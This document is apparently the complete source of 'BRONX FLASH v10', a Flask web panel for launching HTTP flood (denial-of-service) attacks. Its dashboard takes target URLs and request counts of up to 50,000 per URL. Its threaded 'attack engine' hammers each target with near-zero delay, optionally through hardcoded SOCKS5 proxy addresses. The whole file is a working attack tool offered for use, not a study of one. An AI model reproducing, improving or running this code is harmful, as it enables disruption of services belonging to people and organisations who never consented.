from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []

CF_IPS = ["104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5"]
DEFAULT_PROXIES = ["94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080","176.114.86.151:1080"]

LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v10</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,rgba(255,20,147,0.03) 25%,transparent 25%,transparent 75%,rgba(0,255,136,0.03) 75%);background-size:60px 60px;pointer-events:none}
.snow{position:fixed;color:#ff1493;font-size:14px;animation:fall linear infinite;pointer-events:none;z-index:0;opacity:0.4}
@keyframes fall{0%{transform:translateY(-10vh) rotate(0deg)}100%{transform:translateY(110vh) rotate(360deg)}}
.box{background:rgba(10,10,10,0.98);padding:45px 40px;border-radius:20px;border:1px solid rgba(255,20,147,0.3);width:400px;text-align:center;z-index:1;box-shadow:0 0 60px rgba(255,20,147,0.1),0 0 120px rgba(0,255,136,0.05)}
.logo{font-size:3em;margin-bottom:10px;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
h1{font-size:1.8em;font-weight:700;background:linear-gradient(135deg,#ff1493,#00ff88,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px}
.tag{color:#888;font-size:0.7em;letter-spacing:4px;text-transform:uppercase;margin:8px 0}
input{width:100%;padding:14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.1);border-radius:10px;color:#fff;margin:10px 0;font-size:14px;transition:0.3s}
input:focus{border-color:#ff1493;box-shadow:0 0 20px rgba(255,20,147,0.2);outline:none}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff1493,#ffd700);color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;margin-top:12px;letter-spacing:2px;text-transform:uppercase;transition:0.3s}
.btn:hover{box-shadow:0 0 40px rgba(255,20,147,0.4);transform:translateY(-2px)}
</style></head><body>
<div class="box">
<div class="logo">⚡</div>
<h1>BRONX FLASH</h1>
<div class="tag">v10 • Lightning Network</div>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">Access System</button>
</form>
{% if error %}<p style="color:#ff1493;margin-top:10px;font-size:12px">{{ error }}</p>{% endif %}
</div>
<script>
for(let i=0;i<25;i++){let s=document.createElement('div');s.className='snow';s.innerHTML=['❄️','💎','⚡','✨','💫'][Math.floor(Math.random()*5)];s.style.left=Math.random()*100+'%';s.style.animationDuration=(Math.random()*8+4)+'s';s.style.animationDelay=Math.random()*5+'s';document.body.appendChild(s)}
</script></body></html>"""

DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v10 • Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;overflow-x:hidden;line-height:1.5}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(255,20,147,0.05) 0%,transparent 50%),radial-gradient(circle at 80% 100%,rgba(0,255,136,0.05) 0%,transparent 50%);pointer-events:none;z-index:0}
.container{max-width:1100px;margin:0 auto;position:relative;z-index:1}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 30px;border:1px solid rgba(255,255,255,0.08);border-radius:16px;margin-bottom:20px;background:rgba(255,255,255,0.02);flex-wrap:wrap;gap:15px}
.header h1{font-size:1.6em;font-weight:700;background:linear-gradient(135deg,#ff1493,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.header .info{color:#666;font-size:0.7em;letter-spacing:2px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-bottom:20px}
.card{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:22px}
.card h3{font-size:0.8em;font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-bottom:15px;color:#888}
input,select,textarea{width:100%;padding:11px 14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#fff;margin:6px 0;font-size:13px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff1493;box-shadow:0 0 15px rgba(255,20,147,0.15);outline:none}
label{font-size:0.65em;text-transform:uppercase;letter-spacing:2px;color:#666;display:block;margin-top:10px}
.btn{width:100%;padding:12px 18px;background:linear-gradient(135deg,#ff1493,#ffd700);color:#000;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.75em;letter-spacing:2px;text-transform:uppercase;transition:0.25s;margin:6px 0}
.btn:hover{box-shadow:0 0 30px rgba(255,20,147,0.3);transform:translateY(-1px)}.btn:active{transform:scale(0.98)}
.btn-secondary{background:rgba(255,255,255,0.05);color:#888;border:1px solid rgba(255,255,255,0.1)}.btn-secondary:hover{box-shadow:0 0 20px rgba(255,255,255,0.1);color:#fff}
.btn-danger{background:rgba(255,0,0,0.2);color:#ff4444;border:1px solid rgba(255,0,0,0.3)}.btn-danger:hover{box-shadow:0 0 20px rgba(255,0,0,0.3)}
.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
.stat{background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:18px;text-align:center}
.stat-value{font-size:2em;font-weight:700}.stat-label{font-size:0.6em;text-transform:uppercase;letter-spacing:3px;color:#666;margin-top:4px}
.success{color:#00ff88}.danger{color:#ff1493}.warning{color:#ffd700}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
.toggle{width:44px;height:24px;background:rgba(255,255,255,0.1);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff1493;box-shadow:0 0 15px rgba(255,20,147,0.3)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
.logs{background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.05);border-radius:10px;padding:14px;max-height:280px;overflow:auto;font-size:0.7em;font-family:'SF Mono','Fira Code',monospace;color:#00ff88}
.log-entry{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}.log-entry:last-child{border:none}
.badge{display:inline-block;padding:5px 12px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}.badge-active{background:rgba(255,20,147,0.15);color:#ff1493;animation:blink 1.5s infinite}
@keyframes blink{50%{opacity:0.5}}
.footer{text-align:center;padding:20px;color:rgba(255,255,255,0.2);font-size:0.6em;letter-spacing:3px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>BRONX FLASH</h1><div class="info">v10 • LIGHTNING NETWORK</div></div>
<div style="display:flex;gap:10px"><a href="/logout" style="color:#ff1493;text-decoration:none;font-size:0.7em;letter-spacing:2px">DISCONNECT</a></div>
</div>

<div class="stats-row">
<div class="stat"><div class="stat-value success" id="success">0</div><div class="stat-label">Success</div></div>
<div class="stat"><div class="stat-value danger" id="failed">0</div><div class="stat-label">Failed</div></div>
<div class="stat"><div class="stat-value warning" id="total">0</div><div class="stat-label">Total</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 Target Configuration</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="4" placeholder="https://api.target1.com&#10;https://api.target2.com&#10;https://api.target3.com"></textarea>
<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="1000"></div><div><label>Speed Mode</label><select id="speed"><option value="flash">🥵 NORMAL (50ms)</option><option value="fast">Fast (10ms)</option><option value="normal">Flash Speed ⚡ (00ms)</option></select></div></div>
<button class="btn" onclick="start()">Launch Attack</button>
<button class="btn btn-danger" onclick="stop()">stop</button>
<div id="status" style="margin-top:8px"></div>
</div>

<div class="card">
<h3>🔧 Proxy Configuration</h3>
<div class="toggle-row">
<span style="font-size:0.7em;color:#666">Proxy System</span>
<div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div>
<span id="proxyLabel" style="font-size:0.7em;color:#666">OFF</span>
</div>
<label>Custom Proxies (IP:Port per line)</label>
<textarea id="customProxies" rows="3" placeholder="94.158.244.245:1080&#10;68.71.249.153:48606"></textarea>
<button class="btn btn-secondary" onclick="saveProxies()">Save Proxies</button>
<div id="proxyCount" style="font-size:0.6em;color:#666;margin-top:6px">Default: 4 Proxies</div>
</div>
</div>

<div class="card"><h3>📜 DDOS Logs</h3><div class="logs" id="logs"><div class="log-entry">System ready. Awaiting command...</div></div></div>
<div class="footer">BRONX FLASH v10 • HACKER</div>
</div>

<script>
let proxyOn=false;
function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
function saveProxies(){let p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{document.getElementById('proxyCount').textContent=d.count+' Proxies Loaded'})}
function u(){fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;document.getElementById('total').textContent=d.total})}
function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log-entry">${x}</div>`).join('')})}
function start(){let urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());let count=document.getElementById('count').value;let speed=document.getElementById('speed').value;if(urls.length==0)return;fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({urls,count:parseInt(count),speed,proxy:proxyOn})}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span class="badge badge-active">ACTIVE</span>';l();u()})}
function stop(){fetch('/stop',{method:'POST'}).then(r=>r.json()).then(d=>{document.getElementById('status').innerHTML='<span style="color:#666">Terminated</span>';l()})}
setInterval(()=>{l();u()},1500)
</script></body></html>"""

# ============================================
# ⚡ LIGHTNING ATTACK ENGINE
# ============================================
def send_request(url, proxy=None):
    try:
        if proxy:
            p = {"http":f"socks5://{proxy}","https":f"socks5://{proxy}"}
            requests.get(url, proxies=p, timeout=8, headers={"User-Agent":"Mozilla/5.0"}, verify=False)
        else:
            requests.get(url, timeout=5, headers={"User-Agent":"Mozilla/5.0","Connection":"close"}, verify=False)
        return True
    except: return False

def attack_worker(attack_id, url, count, speed, use_proxy):
    all_proxies = custom_proxies + DEFAULT_PROXIES
    delays = {"flash":0,"fast":0.01,"normal":0.05}
    delay = delays.get(speed,0)
    
    for i in range(count):
        if attack_id not in active_attacks: break
        
        proxy = random.choice(all_proxies) if use_proxy else None
        success = send_request(url, proxy)
        
        if success: attack_stats["success"] += 1
        else: attack_stats["failed"] += 1
        attack_stats["total"] += 1
        
        if delay > 0: time.sleep(delay)

def run_multi_attack(attack_id, urls, count, speed, use_proxy):
    with ThreadPoolExecutor(max_workers=min(len(urls)*2, 50)) as executor:
        for url in urls:
            executor.submit(attack_worker, attack_id, url, count, speed, use_proxy)
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    attack_logs.append(f"Complete: {attack_stats['success']} success, {attack_stats['failed']} failed")

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="Access Denied")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',100)),50000)
    speed = d.get('speed','flash')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"Targets: {len(urls)} | Requests: {count} | Speed: {speed.upper()} | Proxy: {'ON' if use_proxy else 'OFF'}")
    t = threading.Thread(target=run_multi_attack, args=(aid,urls,count,speed,use_proxy))
    t.daemon=True; t.start()
    return jsonify({"status":"started"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("Terminated by user")
    return jsonify({"status":"stopped"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved","count":len(custom_proxies)})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-40:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
